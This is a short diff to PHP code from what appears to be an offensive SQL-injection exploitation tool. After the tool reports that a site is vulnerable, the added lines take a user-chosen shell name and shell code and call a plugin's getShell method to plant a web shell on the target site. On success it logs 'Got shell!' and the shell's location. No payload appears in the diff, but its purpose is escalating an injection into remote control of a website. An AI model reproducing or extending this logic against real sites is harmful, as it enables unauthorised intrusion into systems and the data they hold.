@@ -260,8 +260,30 @@
 
 		$log->log("Site is vulnerable to sql injection!",0,"light_cyan");
 
-		$log->log("PLUGIN\t\t:".$plugin->getPluginName(),0,"light_cyan");
-		$log->log("AUTHOR\t\t:".$plugin->getPluginAuthor(),0,"light_cyan");
+		$shellLocation	=	NULL;
+
+		if(!array_key_exists("no-shell",$options)){
+
+			$shellName	=	array_key_exists("shell-name",$options) ? $options["shell-name"] : "";
+			$shellCode	=	array_key_exists("shell-code",$options) ? $options["shell-code"] : "";
+
+			$plugin->setShellName($shellName);
+			$plugin->setShellCode($shellCode);
+
+			$shellLocation	=	$plugin->getShell($pLoader,$crawler);
+
+			if($shellLocation){
+				$log->log("Got shell! $shellLocation",0,"light_green");
+			}
+
+		}else{
+
+			$log->log("Skipping calling plugin's get shell method",0,"green");
+
+		}
+
+		$log->log("PLUGIN\t\t:".$plugin->getPluginName(),0,"light_purple");
+		$log->log("AUTHOR\t\t:".$plugin->getPluginAuthor(),0,"light_purple");
 
 		if($options["schema"]!=="none"){
 
@@ -299,6 +321,8 @@
 			}
 
 		}
+
+		
 
 		return TRUE;
 
